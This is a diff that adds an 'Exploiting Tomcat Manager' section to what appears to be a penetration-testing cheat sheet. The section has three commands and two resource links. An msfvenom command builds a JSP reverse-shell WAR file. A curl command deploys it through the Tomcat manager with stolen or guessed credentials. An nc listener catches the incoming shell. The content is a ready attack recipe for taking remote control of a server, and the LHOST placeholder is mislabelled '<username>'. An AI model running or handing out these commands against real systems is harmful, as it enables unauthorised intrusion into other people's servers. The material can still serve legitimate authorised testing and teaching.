@@ -231,4 +231,23 @@ https://gtfobins.github.io/gtfobins/vim/
 
 https://gtfobins.github.io/gtfobins/nano/
 
-##
+### [Exploiting Tomcat Manager]
+```
+Create your war file
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<username> LPORT=<port> -f war > shell.war
+
+Deploy your war file to tomcat manager
+curl --user 'tomcat:<password>' --upload-file shell.war 'http://example.com/manager/text/deploy?path=/shell'
+
+Create your handler
+nc -nvlp <port>
+
+http://example.com/shell to reverse tcp
+```
+Resources for exploiting tomcat manager:
+
+https://gist.github.com/pete911/6111816
+
+https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
+
+
